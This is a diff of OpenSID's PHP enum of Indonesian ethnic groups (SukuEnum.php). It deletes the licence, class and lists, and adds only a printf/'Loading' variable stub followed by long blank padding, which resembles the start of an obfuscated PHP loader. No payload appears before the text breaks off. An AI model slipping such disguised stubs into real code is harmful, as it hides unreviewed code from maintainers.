@@ -1,583 +1,385 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Enums/SukuEnum.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Enums;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class SukuEnum extends BaseEnum
-{
-    public const ACEH                = 'Aceh';
-    public const ALAS                = 'Alas';
-    public const ALOR                = 'Alor';
-    public const AMBON               = 'Ambon';
-    public const AMPANA              = 'Ampana';
-    public const ANAK_DALAM          = 'Anak Dalam';
-    public const ANEUK_JAMEE         = 'Aneuk Jamee';
-    public const ARAB_ORANG_HADHRAMI = 'Arab: Orang Hadhrami';
-    public const ARU                 = 'Aru';
-    public const ASMAT               = 'Asmat';
-    public const BARE’E              = 'Bare’e';
-    public const BANTEN              = 'Banten';
-    public const BESEMAH             = 'Besemah';
-    public const BALI                = 'Bali';
-    public const BALANTAK            = 'Balantak';
-    public const BANGGAI             = 'Banggai';
-    public const BADUY               = 'Baduy';
-    public const BAJAU               = 'Bajau';
-    public const BANJAR              = 'Banjar';
-    public const BATAK               = 'Batak';
-    public const BATAK_KARO          = 'Batak Karo';
-    public const MANDAILING          = 'Mandailing';
-    public const ANGKOLA             = 'Angkola';
-    public const TOBA                = 'Toba';
-    public const PAKPAK              = 'Pakpak';
-    public const SIMALUNGUN          = 'Simalungun';
-    public const BATIN               = 'Batin';
-    public const BAWEAN              = 'Bawean';
-    public const BENTONG             = 'Bentong';
-    public const BERAU               = 'Berau';
-    public const BETAWI              = 'Betawi';
-    public const BIMA                = 'Bima';
-    public const BOTI                = 'Boti';
-    public const BOLANG_MONGONDOW    = 'Bolang Mongondow';
-    public const BUGIS               = 'Bugis';
-    public const BUNGKU              = 'Bungku';
-    public const BURU                = 'Buru';
-    public const BUOL                = 'Buol';
-    public const BULUNGAN            = 'Bulungan ';
-    public const BUTON               = 'Buton';
-    public const BONAI               = 'Bonai';
-    public const CHAM                = 'Cham ';
-    public const CIREBON             = 'Cirebon ';
-    public const DAMAL               = 'Damal';
-    public const DAMPELES            = 'Dampeles';
-    public const DANI                = 'Dani ';
-    public const DAIRI               = 'Dairi';
-    public const DAYA                = 'Daya ';
-    public const DAYAK               = 'Dayak';
-    public const DOMPU               = 'Dompu';
-    public const DONGGO              = 'Donggo';
-    public const DONGGA              = 'Dongga';
-    public const DONDO               = 'Dondo ';
-    public const DURI                = 'Duri';
-    public const EROPA               = 'Eropa ';
-    public const FLORES              = 'Flores';
-    public const LAMAHOLOT           = 'Lamaholot';
-    public const GAYO                = 'Gayo';
-    public const GORONTALO           = 'Gorontalo';
-    public const GUMAI               = 'Gumai ';
-    public const INDIA               = 'India';
-    public const JAWA                = 'Jawa';
-    public const TENGGER             = 'Tengger';
-    public const OSING               = 'Osing ';
-    public const SAMIN               = 'Samin ';
-    public const JAMBI               = 'Jambi ';
-    public const JEPANG              = 'Jepang';
-    public const KEI                 = 'Kei';
-    public const KAILI               = 'Kaili ';
-    public const KAMPAR              = 'Kampar';
-    public const KAUR                = 'Kaur ';
-    public const KAYU_AGUNG          = 'Kayu Agung';
-    public const KERINCI             = 'Kerinci';
-    public const KOMERING            = 'Komering ';
-    public const KONJO_PEGUNUNGAN    = 'Konjo Pegunungan';
-    public const KONJO_PESISIR       = 'Konjo Pesisir';
-    public const KOTO                = 'Koto';
-    public const KUBU                = 'Kubu';
-    public const KULAWI              = 'Kulawi';
-    public const KUTAI               = 'Kutai ';
-    public const KLUET               = 'Kluet ';
-    public const KOREA               = 'Korea ';
-    public const KRUI                = 'Krui';
-    public const LAUT                = 'Laut,';
-    public const LAMPUNG             = 'Lampung';
-    public const LEMATANG            = 'Lematang ';
-    public const LEMBAK              = 'Lembak';
-    public const LINTANG             = 'Lintang';
-    public const LOM                 = 'Lom';
-    public const LORE                = 'Lore';
-    public const LUBU                = 'Lubu';
-    public const MORONENE            = 'Moronene';
-    public const MADURA              = 'Madura';
-    public const MAKASSAR            = 'Makassar';
-    public const MAMASA              = 'Mamasa';
-    public const MANDA               = 'Manda';
-    public const MELAYU              = 'Melayu';
-    public const MENTAWAI            = 'Mentawai';
-    public const MINAHASA            = 'Minahasa';
-    public const PONOSAKAN           = 'Ponosakan';
-    public const MINANGKABAU         = 'Minangkabau';
-    public const MONGONDOW           = 'Mongondow';
-    public const MORI                = 'Mori';
-    public const MUKO_MUKO           = 'Muko-Muko';
-    public const MUNA                = 'Muna';
-    public const MUYU                = 'Muyu';
-    public const MEKONGGA            = 'Mekongga';
-    public const MORO                = 'Moro';
-    public const NIAS                = 'Nias';
-    public const NGADA               = 'Ngada ';
-    public const OGAN                = 'Ogan';
-    public const OCU                 = 'Ocu';
-    public const PADOE               = 'Padoe';
-    public const PAPUA               = 'Papua';
-    public const PALEMBANG           = 'Palembang';
-    public const PAMONA              = 'Pamona';
-    public const PESISI              = 'Pesisi';
-    public const PASIR               = 'Pasir';
-    public const PUBIAN              = 'Pubian';
-    public const PATTAE              = 'Pattae';
-    public const PAKISTANI           = 'Pakistani';
-    public const PERANAKAN           = 'Peranakan';
-    public const RAWA                = 'Rawa';
-    public const REJANG              = 'Rejang';
-    public const ROTE                = 'Rote';
-    public const RONGGA              = 'Rongga';
-    public const ROHINGYA            = 'Rohingya';
-    public const SABU                = 'Sabu';
-    public const SALUAN              = 'Saluan';
-    public const SAMBAS              = 'Sambas';
-    public const SANGI               = 'Sangi';
-    public const SASAK               = 'Sasak';
-    public const SEKAK_BANGKA        = 'Sekak Bangka';
-    public const SEKAYU              = 'Sekayu';
-    public const SEMENDO             = 'Semendo ';
-    public const SERAWAI             = 'Serawai ';
-    public const SIMEULUE            = 'Simeulue';
-    public const SIGULAI             = 'Sigulai ';
-    public const SULUK               = 'Suluk';
-    public const SUMBAWA             = 'Sumbawa ';
-    public const SUMBA               = 'Sumba';
-    public const SUNDA               = 'Sunda';
-    public const SUNGKAI             = 'Sungkai ';
-    public const TALAU               = 'Talau';
-    public const TALANG_MAMAK        = 'Talang Mamak';
-    public const TAMIANG             = 'Tamiang ';
-    public const TERNATE             = 'Ternate ';
-    public const TIDORE              = 'Tidore';
-    public const TIDUNG              = 'Tidung';
-    public const TIMOR               = 'Timor';
-    public const TIONGHOA            = 'Tionghoa';
-    public const TOJO                = 'Tojo';
-    public const TORAJA              = 'Toraja';
-    public const TOLAKI              = 'Tolaki';
-    public const TOLI_TOLI           = 'Toli Toli';
-    public const TOMINI              = 'Tomini';
-    public const UNA_UNA             = 'Una-una ';
-    public const ULU                 = 'Ulu';
-    public const WOLIO               = 'Wolio';
 
-    // jenis suku/etnis di minangkabau
-    public const AMPU                    = 'Ampu';
-    public const AMBACANG_LILIN          = 'Ambacang Lilin';
-    public const ANDOMO                  = 'Andomo';
-    public const BACIN                   = 'Bacin';
-    public const BALAIMANSIANG_MANSIANG  = 'Balaimansiang (Mansiang)';
-    public const BALAIGAMBA              = 'Balaigamba';
-    public const BANUHAMPU               = 'Banuhampu';
-    public const BARINGIN                = 'Baringin';
-    public const BARIANG                 = 'Bariang';
-    public const BAPAYUANG               = 'Bapayuang';
-    public const BARAGUANG               = 'Baraguang';
-    public const BULUHKASOK              = 'Buluhkasok';
-    public const BATUPAEK                = 'Batupaek';
-    public const BATUKAMBIANG            = 'Batukambiang';
-    public const BENDANG                 = 'Bendang';
-    public const BICU                    = 'Bicu';
-    public const BODI                    = 'Bodi';
-    public const BONUO                   = 'Bonuo';
-    public const CANIAGO                 = 'Caniago';
-    public const CUPAK                   = 'Cupak';
-    public const DALIMO                  = 'Dalimo';
-    public const DOMO                    = 'Domo';
-    public const DURIAN                  = 'Durian';
-    public const GALAPUANG               = 'Galapuang';
-    public const GANTIANG                = 'Gantiang';
-    public const GUCI                    = 'Guci';
-    public const GUDAM                   = 'Gudam';
-    public const GUGUN                   = 'Gugun';
-    public const HARAU                   = 'Harau';
-    public const JAMBAK                  = 'Jambak';
-    public const KABARU                  = 'Kabaru';
-    public const KALUMPANG               = 'Kalumpang';
-    public const KATAPANG                = 'Katapang';
-    public const KAMPAI                  = 'Kampai';
-    public const KOTO_MINANGKABAU        = 'Koto (Minangkabau)';
-    public const KORONGGADANG            = 'Koronggadang';
-    public const KORONGPANJANG           = 'Korongpanjang';
-    public const KORONGDALAM             = 'Korongdalam';
-    public const KUTIANYIA               = 'Kutianyia';
-    public const LIMOPANJANG             = 'Limopanjang';
-    public const LIMOSINGKEK             = 'Limosingkek';
-    public const LIMOKORONG              = 'Limokorong';
-    public const LUBUKBATANG             = 'Lubukbatang';
-    public const MAIH                    = 'Maih';
-    public const MALAYU                  = 'Malayu';
-    public const MANDAILING_MINANGKABAU  = 'Mandailing (Minangkabau)';
-    public const MANDALIKO               = 'Mandaliko';
-    public const MEJAN                   = 'Mejan';
-    public const MUAROBASA               = 'Muarobasa';
-    public const NANLIMO                 = 'Nanlimo';
-    public const NANANAM                 = 'Nananam';
-    public const NANTUJUAH               = 'Nantujuah';
-    public const NANSAMBILAN             = 'Nansambilan';
-    public const NANGKOPUH_KONDANG_KOPUH = 'Nangkopuh/Kondang Kopuh';
-    public const NILIANG                 = 'Niliang';
-    public const PAGACANCANG             = 'Pagacancang';
-    public const PARIKCANCANG            = 'Parikcancang';
-    public const PANGIAN                 = 'Pangian';
-    public const PAROBEK                 = 'Parobek';
-    public const PANAMPUANG              = 'Panampuang';
-    public const PAUH                    = 'Pauh';
-    public const PANAI                   = 'Panai';
-    public const PANAI_LINJUANG          = 'Panai Linjuang';
-    public const PANYALAI                = 'Panyalai';
-    public const PIBODA_PAYOBADA         = 'Piboda (Payobada)';
-    public const PILIANG                 = 'Piliang';
-    public const PINYANGEK               = 'Pinyangek';
-    public const PITOPANG                = 'Pitopang';
-    public const PUNGKUIK                = 'Pungkuik';
-    public const PONGGANG                = 'Ponggang';
-    public const RABU                    = 'Rabu';
-    public const RAJODANI                = 'Rajodani';
-    public const SALAYAN                 = 'Salayan';
-    public const SALO                    = 'Salo';
-    public const SAMBILAN                = 'Sambilan';
-    public const SIKUMBANG               = 'Sikumbang';
-    public const SIJANGKO                = 'Sijangko';
-    public const SIMAUANG                = 'Simauang';
-    public const SIGANDANG               = 'Sigandang';
-    public const SIDAUA                  = 'Sidaua';
-    public const SIMABUA                 = 'Simabua';
-    public const SINAPA                  = 'Sinapa';
-    public const SINGKUAN                = 'Singkuan';
-    public const SINGKUANG               = 'Singkuang';
-    public const SIPISANG                = 'Sipisang';
-    public const SITABEK                 = 'Sitabek';
-    public const SITIMBAGO               = 'Sitimbago';
-    public const SITUNGGANG              = 'Situnggang';
-    public const SOBORANG                = 'Soborang';
-    public const SUMAGEK                 = 'Sumagek';
-    public const SUMPU                   = 'Sumpu';
-    public const SUMPADANG               = 'Sumpadang';
-    public const SUPANJANG               = 'Supanjang';
-    public const TAMPUNIK                = 'Tampunik';
-    public const TANJUANG                = 'Tanjuang';
-    public const TAMBANGPADANG           = 'Tambangpadang';
-    public const TIGOLAREH               = 'Tigolareh';
-    public const TOBO                    = 'Tobo';
-    public const TONGAH                  = 'Tongah';
-    public const TOLANG                  = 'Tolang';
-    public const TUJUAH                  = 'Tujuah';
-    public const TUJUAHINDU              = 'Tujuahindu';
-    public const TIGONINIAK              = 'Tigoniniak';
-    public const LAINNYA                 = 'Lainnya';
 
-    /**
-     * Override method all()
-     */
-    public static function all(): array
-    {
-        return [
-            self::ACEH                => 'Aceh',
-            self::ALAS                => 'Aceh',
-            self::ALOR                => 'NTT',
-            self::AMBON               => 'Ambon',
-            self::AMPANA              => 'Sulawesi Tengah',
-            self::ANAK_DALAM          => 'Jambi',
-            self::ANEUK_JAMEE         => 'Aceh',
-            self::ARAB_ORANG_HADHRAMI => 'Arab: Orang Hadhrami',
-            self::ARU                 => 'Maluku',
-            self::ASMAT               => 'Papua',
-            self::BARE’E              => 'Bare’e di Kabupaten Tojo Una-Una Tojo dan Tojo Barat',
-            self::BANTEN              => 'Banten di Banten',
-            self::BESEMAH             => 'Besemah di Sumatera Selatan',
-            self::BALI                => "Bali\u{a0}di Bali terdiri dari: Suku Bali Majapahit di sebagian besar Pulau Bali; Suku Bali Aga di Karangasem dan Kintamani",
-            self::BALANTAK            => 'Balantak di Sulawesi Tengah',
-            self::BANGGAI             => 'Banggai di Sulawesi Tengah (Kabupaten Banggai Kepulauan)',
-            self::BADUY               => "Baduy\u{a0}di Banten",
-            self::BAJAU               => 'Bajau di Kalimantan Timur',
-            self::BANJAR              => 'Banjar di Kalimantan Selatan',
-            self::BATAK               => 'Sumatera Utara',
-            self::BATAK_KARO          => 'Sumatera Utara',
-            self::MANDAILING          => 'Sumatera Utara',
-            self::ANGKOLA             => 'Sumatera Utara',
-            self::TOBA                => 'Sumatera Utara',
-            self::PAKPAK              => 'Sumatera Utara',
-            self::SIMALUNGUN          => 'Sumatera Utara',
-            self::BATIN               => 'Batin di Jambi',
-            self::BAWEAN              => 'Bawean di Jawa Timur (Gresik)',
-            self::BENTONG             => 'Bentong di Sulawesi Selatan',
-            self::BERAU               => 'Berau di Kalimantan Timur (kabupaten Berau)',
-            self::BETAWI              => 'Betawi di Jakarta',
-            self::BIMA                => 'Bima NTB (kota Bima)',
-            self::BOTI                => 'Boti di kabupaten Timor Tengah Selatan',
-            self::BOLANG_MONGONDOW    => 'Bolang Mongondow di Sulawesi Utara (Kabupaten Bolaang Mongondow)',
-            self::BUGIS               => "Bugis\u{a0}di Sulawesi Selatan: Orang Bugis Pagatan di Kalimantan Selatan, Kusan Hilir, Tanah Bumbu",
-            self::BUNGKU              => 'Bungku di Sulawesi Tengah (Kabupaten Morowali)',
-            self::BURU                => 'Buru di Maluku (Kabupaten Buru)',
-            self::BUOL                => 'Buol di Sulawesi Tengah (Kabupaten Buol)',
-            self::BULUNGAN            => 'Bulungan di Kalimantan Timur (Kabupaten Bulungan)',
-            self::BUTON               => 'Buton di Sulawesi Tenggara (Kabupaten Buton dan Kota Bau-Bau)',
-            self::BONAI               => 'Bonai di Riau (Kabupaten Rokan Hilir)',
-            self::CHAM                => 'Cham di Aceh',
-            self::CIREBON             => 'Cirebon di Jawa Barat (Kota Cirebon)',
-            self::DAMAL               => 'Damal di Mimika',
-            self::DAMPELES            => 'Dampeles di Sulawesi Tengah',
-            self::DANI                => 'Dani di Papua (Lembah Baliem)',
-            self::DAIRI               => 'Dairi di Sumatera Utara',
-            self::DAYA                => 'Daya di Sumatera Selatan',
-            self::DAYAK               => "Dayak\u{a0}terdiri dari: Suku Dayak Ahe di Kalimantan Barat; Suku Dayak Bajare di Kalimantan Barat; Suku Dayak Damea di Kalimantan Barat; Suku Dayak Banyadu di Kalimantan Barat; Suku Bakati di Kalimantan Barat; Suku Punan di Kalimantan Tengah; Suku Kanayatn di Kalimantan Barat; Suku Dayak Krio di Kalimantan Barat (Ketapang); Suku Dayak Sungai Laur di Kalimantan Barat (Ketapang); Suku Dayak Simpangh di Kalimantan Barat (Ketapang); Suku Iban di Kalimantan Barat; Suku Mualang di Kalimantan Barat (Sekada",
-            self::DOMPU               => 'Dompu NTB (Kabupaten Dompu)',
-            self::DONGGO              => 'Donggo, Bima',
-            self::DONGGA              => 'Donggala di Sulawesi Tengah',
-            self::DONDO               => 'Dondo di Sulawesi Tengah (Kabupaten Toli-Toli)',
-            self::DURI                => 'Duri Terletak di bagian utara Kabupaten Enrekang berbatasan dengan Kabupaten Tana Toraja, meliputi tiga kecamatan induk Anggeraja, Baraka, dan Alla di Sulawesi Selatan',
-            self::EROPA               => 'Eropa (orang Indo, peranakan Eropa-Indonesia, atau etnik Mestizo)',
-            self::FLORES              => 'Flores di NTT (Flores Timur)',
-            self::LAMAHOLOT           => 'Lamaholot, Flores Timur, terdiri dari: Suku Wandan, di Solor Timur, Flores Timur; Suku Kaliha, di Solor Timur, Flores Timur; Suku Serang Gorang, di Solor Timur, Flores Timur; Suku Lamarobak, di Solor Timur, Flores Timur; Suku Atanuhan, di Solor Timur, Flores Timur; Suku Wotan, di Solor Timur, Flores Timur; Suku Kapitan Belen, di Solor Timur, Flores Timur',
-            self::GAYO                => 'Gayo di Aceh (Gayo Lues Aceh Tengah Bener Meriah Aceh Tenggara Aceh Timur Aceh Tamiang)',
-            self::GORONTALO           => 'Gorontalo di Gorontalo (Kota Gorontalo)',
-            self::GUMAI               => 'Gumai di Sumatera Selatan (Lahat)',
-            self::INDIA               => 'India, terdiri dari: Suku Tamil di Aceh, Sumatera Utara, Sumatera Barat, dan DKI Jakarta; Suku Punjab di Sumatera Utara, DKI Jakarta, dan Jawa Timur; Suku Bengali di DKI Jakarta; Suku Gujarati di DKI Jakarta dan Jawa Tengah; Orang Sindhi di DKI Jakarta dan Jawa Timur; Orang Sikh di Sumatera Utara, DKI Jakarta, dan Jawa Timur',
-            self::JAWA                => 'Jawa di Jawa Tengah, Jawa Timur, DI Yogyakarta',
-            self::OSING               => 'Osing di Jawa Timur (Banyuwangi)',
-            self::JAMBI               => 'Jambi di Jambi (Kota Jambi)',
-            self::JEPANG              => 'Jepang di DKI Jakarta, Jawa Timur, dan Bali',
-            self::KEI                 => 'Kei di Maluku Tenggara (Kabupaten Maluku Tenggara dan Kota Tual)',
-            self::KAILI               => 'Kaili di Sulawesi Tengah (Kota Palu)',
-            self::KAMPAR              => 'Kampar',
-            self::KAUR                => 'Kaur di Bengkulu (Kabupaten Kaur)',
-            self::KAYU_AGUNG          => 'Kayu Agung di Sumatera Selatan',
-            self::KERINCI             => 'Kerinci di Jambi (Kabupaten Kerinci)',
-            self::KOMERING            => 'Komering di Sumatera Selatan (Kabupaten Ogan Komering Ilir, Baturaja)',
-            self::KONJO_PEGUNUNGAN    => 'Konjo Pegunungan, Kabupaten Gowa, Sulawesi Selatan',
-            self::KONJO_PESISIR       => 'Konjo Pesisir, Kabupaten Bulukumba, Sulawesi Selatan',
-            self::KOTO                => 'Koto di Sumatera Barat',
-            self::KUBU                => 'Kubu di Jambi dan Sumatera Selatan',
-            self::KULAWI              => 'Kulawi di Sulawesi Tengah',
-            self::KUTAI               => 'Kutai di Kalimantan Timur (Kutai Kartanegara)',
-            self::KLUET               => 'Kluet di Aceh (Aceh Selatan)',
-            self::KOREA               => 'Korea di DKI Jakarta',
-            self::KRUI                => 'Krui di Lampung',
-            self::LAUT                => 'Laut, Kepulauan Riau',
-            self::LAMPUNG             => 'Lampung, terdiri dari: Suku Sungkai di Lampung; Suku Abung di Lampung; Suku Way Kanan di Lampung, Sumatera Selatan dan Bengkulu; Suku Pubian di Lampung; Suku Tulang Bawang di Lampung; Suku Melinting di Lampung; Suku Peminggir Teluk di Lampung; Suku Ranau di Lampung, Sumatera Selatan dan Sumatera Utara; Suku Komering di Sumatera Selatan; Suku Cikoneng di Banten; Suku Merpas di Bengkulu; Suku Belalau di Lampung; Suku Smoung di Lampung; Suku Semaka di Lampung',
-            self::LEMATANG            => 'Lematang di Sumatera Selatan',
-            self::LEMBAK              => 'Lembak, Kabupaten Rejang Lebong, Bengkulu',
-            self::LINTANG             => 'Lintang, Sumatera Selatan',
-            self::LOM                 => 'Lom, Bangka Belitung',
-            self::LORE                => 'Lore, Sulawesi Tengah',
-            self::LUBU                => 'Lubu, daerah perbatasan antara Provinsi Sumatera Utara dan Provinsi Sumatera Barat',
-            self::MORONENE            => 'Moronene di Sulawesi Tenggara.',
-            self::MADURA              => 'Madura di Jawa Timur (Pulau Madura, Kangean, wilayah Tapal Kuda)',
-            self::MAKASSAR            => 'Makassar di Sulawesi Selatan: Kabupaten Gowa, Kabupaten Takalar, Kabupaten Jeneponto, Kabupaten Bantaeng, Kabupaten Bulukumba (sebagian), Kabupaten Sinjai (bagian perbatasan Kab Gowa), Kabupaten Maros (sebagian), Kabupaten Pangkep (sebagian), Kota Makassar',
-            self::MAMASA              => 'Mamasa (Toraja Barat) di Sulawesi Barat: Kabupaten Mamasa',
-            self::MANDA               => 'Mandar Sulawesi Barat: Polewali Mandar',
-            self::MELAYU              => 'Melayu, terdiri dari Suku Melayu Tamiang di Aceh (Aceh Tamiang); Suku Melayu Riau di Riau dan Kepulauan Riau; Suku Melayu Deli di Sumatera Utara; Suku Melayu Jambi di Jambi; Suku Melayu Bangka di Pulau Bangka; Suku Melayu Belitung di Pulau Belitung; Suku Melayu Sambas di Kalimantan Barat',
-            self::MENTAWAI            => 'Mentawai di Sumatera Barat (Kabupaten Kepulauan Mentawai)',
-            self::MINAHASA            => 'Minahasa di Sulawesi Utara (Kabupaten Minahasa), terdiri 9 subetnik : Suku Babontehu; Suku Bantik; Suku Pasan Ratahan',
-            self::PONOSAKAN           => 'Ponosakan; Suku Tonsea; Suku Tontemboan; Suku Toulour; Suku Tonsawang; Suku Tombulu',
-            self::MINANGKABAU         => 'Minangkabau, Sumatera Barat',
-            self::MONGONDOW           => 'Mongondow, Sulawesi Utara',
-            self::MORI                => 'Mori, Kabupaten Morowali, Sulawesi Tengah',
-            self::MUKO_MUKO           => 'Muko-Muko di Bengkulu (Kabupaten Mukomuko)',
-            self::MUNA                => 'Muna di Sulawesi Tenggara (Kabupaten Muna)',
-            self::MUYU                => 'Muyu di Kabupaten Boven Digoel, Papua',
-            self::MEKONGGA            => 'Mekongga di Sulawesi Tenggara (Kabupaten Kolaka dan Kabupaten Kolaka Utara)',
-            self::MORO                => 'Moro di Kalimantan Barat dan Kalimantan Utara',
-            self::NIAS                => 'Nias di Sumatera Utara (Kabupaten Nias, Nias Selatan dan Nias Utara dari dua keturunan Jepang dan Vietnam)',
-            self::NGADA               => 'Ngada di NTT: Kabupaten Ngada',
-            self::OGAN                => 'Ogan di Sumatera Selatan',
-            self::OCU                 => 'Ocu di Kabupaten Kampar, Riau',
-            self::PADOE               => 'Padoe di Sulawesi Tengah dan Sulawesi Selatan',
-            self::PAPUA               => 'Papua / Irian, terdiri dari: Suku Asmat di Kabupaten Asmat; Suku Biak di Kabupaten Biak Numfor; Suku Dani, Lembah Baliem, Papua; Suku Ekagi, daerah Paniai, Abepura, Papua; Suku Amungme di Mimika; Suku Bauzi, Mamberamo hilir, Papua utara; Suku Arfak di Manokwari; Suku Kamoro di Mimika',
-            self::PALEMBANG           => 'Palembang di Sumatera Selatan (Kota Palembang)',
-            self::PAMONA              => 'Pamona di Sulawesi Tengah (Kabupaten Poso) dan di Sulawesi Selatan',
-            self::PESISI              => 'Pesisi di Sumatera Utara (Tapanuli Tengah)',
-            self::PASIR               => 'Pasir di Kalimantan Timur (Kabupaten Pasir)',
-            self::PUBIAN              => 'Pubian di Lampung',
-            self::PATTAE              => 'Pattae di Polewali Mandar',
-            self::PAKISTANI           => 'Pakistani di Sumatera Utara, DKI Jakarta, dan Jawa Tengah',
-            self::PERANAKAN           => 'Peranakan (Tionghoa-Peranakan atau Baba Nyonya)',
-            self::RAWA                => 'Rawa, Rokan Hilir, Riau',
-            self::REJANG              => 'Rejang di Bengkulu (Kabupaten Bengkulu Tengah, Kabupaten Bengkulu Utara, Kabupaten Kepahiang, Kabupaten Lebong, dan Kabupaten Rejang Lebong)',
-            self::ROTE                => 'Rote di NTT (Kabupaten Rote Ndao)',
-            self::RONGGA              => 'Rongga di NTT Kabupaten Manggarai Timur',
-            self::ROHINGYA            => 'Rohingya',
-            self::SABU                => 'Sabu di Pulau Sabu, NTT',
-            self::SALUAN              => 'Saluan di Sulawesi Tengah',
-            self::SAMBAS              => 'Sambas (Melayu Sambas) di Kalimantan Barat: Kabupaten Sambas',
-            self::SAMIN               => 'Samin di Jawa Tengah (Blora) dan Jawa Timur (Bojonegoro)',
-            self::SANGI               => 'Sangir di Sulawesi Utara (Kepulauan Sangihe)',
-            self::SASAK               => "Sasak\u{a0}di NTB, Lombok",
-            self::SEKAK_BANGKA        => 'Sekak Bangka',
-            self::SEKAYU              => 'Sekayu di Sumatera Selatan',
-            self::SEMENDO             => 'Semendo di Bengkulu, Sumatera Selatan (Muara Enim)',
-            self::SERAWAI             => 'Serawai di Bengkulu (Kabupaten Bengkulu Selatan dan Kabupaten Seluma)',
-            self::SIMEULUE            => 'Simeulue di Aceh (Kabupaten Simeulue)',
-            self::SIGULAI             => 'Sigulai di Aceh (Kabupaten Simeulue bagian utara',
-            self::SULUK               => 'Suluk di Kalimantan Utara)',
-            self::SUMBAWA             => 'Sumbawa Di NTB (Kabupaten Sumbawa)',
-            self::SUMBA               => 'Sumba di NTT (Sumba Barat, Sumba Timur)',
-            self::SUNDA               => 'Sunda di Jawa Barat, Banten, DKI Jakarta, Lampung, Sumatra Selatan dan Jawa Tengah',
-            self::SUNGKAI             => 'Sungkai di Lampung Lampung Utara',
-            self::TALAU               => 'Talaud di Sulawesi Utara (Kepulauan Talaud)',
-            self::TALANG_MAMAK        => 'Talang Mamak di Riau (Indragiri Hulu)',
-            self::TAMIANG             => 'Tamiang di Aceh (Kabupaten Aceh Tamiang)',
-            self::TENGGER             => 'Tengger di Jawa Timur (Kabupaten Pasuruan) dan Probolinggo (lereng G. Bromo)',
-            self::TERNATE             => 'Ternate di Maluku Utara (Kota Ternate)',
-            self::TIDORE              => 'Tidore di Maluku Utara (Kota Tidore)',
-            self::TIDUNG              => 'Tidung di Kalimantan Timur (Kabupaten Tanah Tidung)',
-            self::TIMOR               => 'Timor di NTT, Kota Kupang',
-            self::TIONGHOA            => 'Tionghoa, terdiri dari: Orang Cina Parit di Pelaihari, Tanah Laut, Kalsel; Orang Cina Benteng di Tangerang, Provinsi Banten; Orang Tionghoa Hokkien di Jawa dan Sumatera Utara; Orang Tionghoa Hakka di Belitung dan Kalimantan Barat; Orang Tionghoa Hubei; Orang Tionghoa Hainan; Orang Tionghoa Kanton; Orang Tionghoa Hokchia; Orang Tionghoa Tiochiu',
-            self::TOJO                => 'Tojo di Sulawesi Tengah (Kabupaten Tojo Una-Una)',
-            self::TORAJA              => 'Toraja di Sulawesi Selatan (Tana Toraja)',
-            self::TOLAKI              => 'Tolaki di Sulawesi Tenggara (Kendari)',
-            self::TOLI_TOLI           => 'Toli Toli di Sulawesi Tengah (Kabupaten Toli-Toli)',
-            self::TOMINI              => 'Tomini di Sulawesi Tengah (Kabupaten Parigi Mouton',
-            self::UNA_UNA             => 'Una-una di Sulawesi Tengah (Kabupaten Tojo Una-Una)',
-            self::ULU                 => 'Ulu di Sumatera Utara (Mandailing natal)',
-            self::WOLIO               => 'Wolio di Sulawesi Tenggara (Buton)',
 
-            // jenis suku/etnis di minangkabau
-            self::AMPU                    => 'Ampu etnis dari Minangkabau',
-            self::AMBACANG_LILIN          => 'Ambacang Lilin etnis dari Minangkabau',
-            self::ANDOMO                  => 'Andomo etnis dari Minangkabau',
-            self::BACIN                   => 'Bacin etnis dari Minangkabau',
-            self::BALAIMANSIANG_MANSIANG  => 'Balaimansiang (Mansiang) etnis dari Minangkabau',
-            self::BALAIGAMBA              => 'Balaigamba etnis dari Minangkabau',
-            self::BANUHAMPU               => 'Banuhampu etnis dari Minangkabau',
-            self::BARINGIN                => 'Baringin etnis dari Minangkabau',
-            self::BARIANG                 => 'Bariang etnis dari Minangkabau',
-            self::BAPAYUANG               => 'Bapayuang etnis dari Minangkabau',
-            self::BARAGUANG               => 'Baraguang etnis dari Minangkabau',
-            self::BULUHKASOK              => 'Buluhkasok etnis dari Minangkabau',
-            self::BATUPAEK                => 'Batupaek etnis dari Minangkabau',
-            self::BATUKAMBIANG            => 'Batukambiang etnis dari Minangkabau',
-            self::BENDANG                 => 'Bendang etnis dari Minangkabau',
-            self::BICU                    => 'Bicu etnis dari Minangkabau',
-            self::BODI                    => 'Bodi etnis dari Minangkabau',
-            self::BONUO                   => 'Bonuo etnis dari Minangkabau',
-            self::CANIAGO                 => 'Caniago etnis dari Minangkabau',
-            self::CUPAK                   => 'Cupak etnis dari Minangkabau',
-            self::DALIMO                  => 'Dalimo etnis dari Minangkabau',
-            self::DOMO                    => 'Domo etnis dari Minangkabau',
-            self::DURIAN                  => 'Durian etnis dari Minangkabau',
-            self::GALAPUANG               => 'Galapuang etnis dari Minangkabau',
-            self::GANTIANG                => 'Gantiang etnis dari Minangkabau',
-            self::GUCI                    => 'Guci etnis dari Minangkabau',
